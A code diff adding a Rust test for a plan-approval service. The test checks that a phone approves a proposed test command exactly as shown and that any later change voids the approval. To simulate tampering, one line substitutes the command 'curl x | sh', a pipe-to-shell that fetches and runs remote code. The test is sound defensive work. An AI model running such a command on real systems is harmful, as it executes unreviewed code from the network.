@@ -511,6 +511,44 @@ async fn a_plan_edited_after_the_challenge_is_changed() {
     assert_eq!(r.json()["reason"], "changed");
 }
 
+/// The test command the lead proposed is shown on the phone, covered by the
+/// digest, and approved with the plan exactly as shown.
+#[tokio::test]
+async fn the_phone_shows_the_test_command_and_approves_it_as_shown() {
+    use sbxw_core::testq::PlanTests;
+    let w = world();
+    let mut p = enrolled(&w, "phone").await;
+    let id = pending_plan(&w, "myapp", "g");
+    let bare = call(&w.router, "GET", &format!("/r/plans/{id}"), Some(&p.token), json!({})).await.json();
+    assert!(bare["plan"]["tests"].is_null(), "{bare}");
+    let shown = PlanTests { command: "npm test -- --ci".into(), timeout_minutes: 45 };
+    w.app.plans.lock().unwrap().note_proposed_tests(&id, Some(shown.clone())).unwrap();
+    let d = call(&w.router, "GET", &format!("/r/plans/{id}"), Some(&p.token), json!({})).await.json();
+    assert_eq!(d["plan"]["tests"], json!({ "command": "npm test -- --ci", "timeout_minutes": 45 }), "{d}");
+    assert_ne!(d["digest"], bare["digest"], "the digest covers the command");
+    // The command changes after the challenge: changed, nothing approved.
+    let ch = challenge(&w, &p, "plan_approve", &id, &format!("/r/plans/{id}"), None).await.unwrap();
+    {
+        let mut book = w.app.plans.lock().unwrap();
+        book.note_proposed_tests(&id, Some(PlanTests { command: "curl x | sh".into(), timeout_minutes: 45 })).unwrap();
+    }
+    let a = assertion(&mut p, &ch, &Twist::default());
+    let r = act(&w, &p, &format!("/r/plans/{id}/approve"), a, None).await;
+    assert_eq!((r.status, r.json()["reason"].as_str()), (StatusCode::CONFLICT, Some("changed")), "{}", r.text());
+    assert_eq!(plan_state(&w, &id), PlanState::Pending);
+    // Only the time limit changes: changed too.
+    let ch = challenge(&w, &p, "plan_approve", &id, &format!("/r/plans/{id}"), None).await.unwrap();
+    w.app.plans.lock().unwrap().note_proposed_tests(&id, Some(PlanTests { command: "curl x | sh".into(), timeout_minutes: 46 })).unwrap();
+    let a = assertion(&mut p, &ch, &Twist::default());
+    assert_eq!(act(&w, &p, &format!("/r/plans/{id}/approve"), a, None).await.json()["reason"], "changed");
+    // Shown again and approved: the command as shown is the plan's.
+    w.app.plans.lock().unwrap().note_proposed_tests(&id, Some(shown.clone())).unwrap();
+    let r = approve_plan(&w, &mut p, &id, &Twist::default()).await;
+    assert_eq!(r.status, StatusCode::OK, "{}", r.text());
+    let plan = w.app.plan(&id).unwrap();
+    assert_eq!((plan.state, plan.approved_tests), (PlanState::Approved, Some(shown)));
+}
+
 // ── Merges, on a real repository ─────────────────────────────────────────
 
 fn git(dir: &std::path::Path, args: &[&str]) -> String {
